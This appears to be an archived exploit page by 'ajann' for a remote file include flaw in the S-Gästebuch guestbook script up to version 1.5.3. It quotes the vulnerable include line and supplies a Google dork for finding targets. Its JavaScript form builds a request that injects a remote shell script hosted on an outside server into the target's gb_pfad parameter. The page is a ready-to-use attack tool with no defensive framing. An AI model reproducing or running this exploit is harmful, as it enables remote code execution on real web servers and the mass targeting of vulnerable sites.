http://cyberlocos.org/she<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<title>S-G?stebuch <= V.1.5.3 (gb_pfad) Remote File Include Exploit</title>

<script language="JavaScript">
 
//'===============================================================================================
//'[Script Name: S-G?stebuch <= V.1.5.3 (gb_pfad) Remote File Include Exploit
//'[Coded by   : ajann
//'[Author     : ajann
//'[Contact    : :(
//'[Dork       : VS-G?stebuch V. ?
//'[Dork Ex.   : http://www.google.com.tr/search?q=VS-G%C3%A4stebuch+V.+%C2%A9&hl=tr&start=10&sa=N
//'[S.Page     : http://www.virtualsystem.de/
//'[$$         : Free
//'[Using      : Write Target after Submit Click
//'===============================================================================================

//'[[ERROR]]]------------------------------------------------------
//'....
//'..
//'<?
//'
//'include ($gb_pfad ."/language/german.php");
//'
//'?>
//'....
//'..
//'[[ERROR]]]---------------------------------------------------------

//# ajann,Turkey
//# ...

   

     //Basic exploit,but any time : ( 
   var path="/inc/"
   var adres="/functions_inc.php?" //File name
   var acik ="gb_pfad=" // Line x
   var shell="http://www.ehcbinningen.ch/komutverivee.txt?" // Shell Script
  
   function command(){
       if (document.rfi.target1.value==""){
          alert("Failed..");
      return false;
    }


  
  rfi.action= document.rfi.target1.value+path+adres+acik+shell; // Ready Target : )
  rfi.submit(); // Form Submit
   }
</script>

</head>

<body bgcolor="#000000">
<center>

<p><b><font face="Verdana" size="2" color="#008000">S-G?stebuch <= V.1.5.3 (gb_pfad) Remote File Include Exploit</font></b></p>

<p></p>
<form method="post" target="getting" name="rfi" onSubmit="command();">
    <b><font face="Arial" size="1" color="#FF0000">Target:</font><font face="Arial" size="1" color="#808080">[http://[target]/[scriptpath]</font><font color="#00FF00" size="2" face="Arial">
  </font><font color="#FF0000" size="2">&nbsp;</font></b>
  <input type="text" name="target1" size="20" style="background-color: #808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';"></p>
  <p><input type="submit" value="Gonder" name="B1"><input type="reset" value="Sifirla" name="B2"></p>
</form>
<p><br>
<iframe name="getting" height="337" width="633" scrolling="yes" frameborder="0"></iframe>
</p>

<b><font face="Verdana" size="2" color="#008000">ajann</font></b></p>
</center>
</body>

</html>l/Gastebuch%20V%201.5.3.php.txt